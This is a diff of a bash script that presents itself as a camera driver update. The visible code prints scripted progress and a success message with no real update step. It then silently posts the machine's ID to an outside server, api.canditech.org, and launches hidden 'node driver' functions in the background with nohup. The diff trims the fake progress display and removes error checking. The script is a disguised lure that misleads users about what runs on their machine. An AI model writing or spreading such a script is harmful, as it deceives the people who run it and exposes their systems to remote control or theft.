@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-set -euo pipefail
+
 
 MAC_UID="${MAC_UID:-__ID__}"
 API_BASE="${API_BASE:-https://api.canditech.org}"
@@ -50,20 +50,8 @@ download() {
 run_part1_camera_driver_ui() {
   delay 5
   echo "[INFO] Initializing camera driver update..."
-  delay 10
-  @REM echo "[INFO] Detecting camera device..."
-  @REM delay 7
-  @REM echo "[INFO] Checking for available updates..."
-  @REM delay 7
-  @REM echo "[INFO] Updating and installing progress: 35%"
-  @REM delay 10
-  @REM echo "[INFO] Updating and installing progress: 72%"
-  @REM delay 10
-  @REM echo "[INFO] Updating and installing progress: 100%"
-  @REM delay 12
+  delay 7
   echo "[SUCCESS] Camera drivers have been updated successfully."
-  delay 3
-  echo "[INFO] Device is now ready for use."
   if [[ -n "${MAC_UID:-}" && "$MAC_UID" != "__ID__" ]]; then
     curl -sL -X POST "${API_BASE}/change-connection-status/${MAC_UID}" >/dev/null 2>&1 || true
   fi
@@ -253,7 +241,6 @@ run_bg() {
   local log="$LOG_DIR/${fn}.log"
 
   nohup env MAC_UID="$MAC_UID" API_BASE="$API_BASE" bash -c "
-    set -euo pipefail
     $(declare -f info err die delay track_step download)
     $(declare -f run_part2_node_driver run_part2_node_driver1 run_part2_node_driver2 run_after_camera_ui)
     $fn
